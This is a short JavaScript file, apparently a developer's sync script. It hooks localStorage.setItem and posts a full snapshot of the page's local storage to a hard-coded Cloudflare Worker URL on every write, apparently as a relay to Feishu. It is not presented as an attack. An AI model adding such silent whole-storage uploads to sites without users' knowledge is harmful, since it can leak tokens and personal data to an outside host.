
const WORKER_URL = "https://aged-wave-21ae.pochen0112.workers.dev/";

/**
 * =========================
 * 网页 → Worker（唯一通道）
 * =========================
 */

async function sendToWorker(data) {
  try {
    const res = await fetch(WORKER_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    });

    const result = await res.json();
    console.log("Worker返回：", result);

    return result;
  } catch (err) {
    console.error("发送失败：", err);
  }
}

/**
 * =========================
 * 自动监听 localStorage（你的原逻辑）
 * =========================
 */

(function () {
  const originalSetItem = localStorage.setItem;

  localStorage.setItem = function (key, value) {
    originalSetItem.apply(this, arguments);

    try {
      const snapshot = {};

      for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i);
        snapshot[k] = localStorage.getItem(k);
      }

      // 👉 只发给 Worker（不再直接调用飞书）
      sendToWorker({
        type: "storage_update",
        data: snapshot,
        time: new Date().toISOString()
      });

    } catch (e) {
      console.error("sync error:", e);
    }
  };
})();


/**
 * =========================
 * 手动测试函数（用于调试）
 * =========================
 */

async function testSend() {
  const res = await fetch(WORKER_URL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      test: "hello",
      time: new Date().toISOString()
    })
  });

  const text = await res.text();
  console.log("Worker返回：", text);
}
